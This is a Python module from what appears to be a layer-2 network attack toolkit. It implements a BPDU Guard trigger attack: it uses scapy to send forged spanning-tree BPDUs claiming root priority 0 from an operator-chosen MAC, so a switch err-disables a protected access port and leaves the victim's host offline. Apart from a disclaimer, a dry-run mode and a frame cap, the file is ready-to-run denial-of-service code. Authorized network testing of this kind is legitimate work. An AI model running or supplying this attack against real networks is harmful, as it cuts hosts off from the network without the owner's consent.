"""BPDU Guard trigger abuse: send STP BPDUs into a port that has BPDU Guard, to shut it down.

BPDU Guard is meant for ports that should never see spanning tree: access ports to hosts,
usually with PortFast. A switch with BPDU Guard disables such a port (err-disable) when a
BPDU arrives on it, and the port stays down until someone re-enables it.

A host behind the same segment as a protected port can send a BPDU into it, and the switch
disables the victim's port. This module sends configuration BPDUs from the operator's MAC,
once per frame, so the effect to measure is whether the protected port goes down.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp
from scapy.packet import Packet

from macabre.attacks.bpdu_spoofing import build_bpdu_frame
from macabre.attacks.common import normalize_unicast_mac

MAX_BPDUS = 100


@dataclass(frozen=True)
class BpduGuardTriggerConfig:
    iface: str                          # attacker interface, on the segment with the protected port
    source_mac: str                     # the sender's MAC on the BPDUs (required)
    bpdus: int = 1                      # BPDUs to send
    dry_run: bool = False               # build BPDUs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if not 1 <= self.bpdus <= MAX_BPDUS:
            raise ValueError(f"BPDUs must be between 1 and {MAX_BPDUS}.")


@dataclass
class BpduGuardTriggerStats:
    bpdus: int = 0
    status: str = ""


def build_trigger(source_mac: str) -> Packet:
    """A configuration BPDU from `source_mac`, claiming root priority 0. Any BPDU triggers the guard."""
    return build_bpdu_frame(source_mac, root_priority=0, bridge_priority=0)


def run_bpdu_guard_trigger(
    config: BpduGuardTriggerConfig,
    stop_event: threading.Event,
    on_progress: Callable[[BpduGuardTriggerStats], None],
    send: Callable[..., Any] | None = None,
) -> BpduGuardTriggerStats:
    """Send the BPDUs once each, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = BpduGuardTriggerStats(
            status=f"Dry run: would send {config.bpdus} BPDU(s) from {config.source_mac}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    stats = BpduGuardTriggerStats()
    frame = build_trigger(config.source_mac)
    for _ in range(config.bpdus):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.bpdus += 1
        on_progress(replace(stats))
    return stats
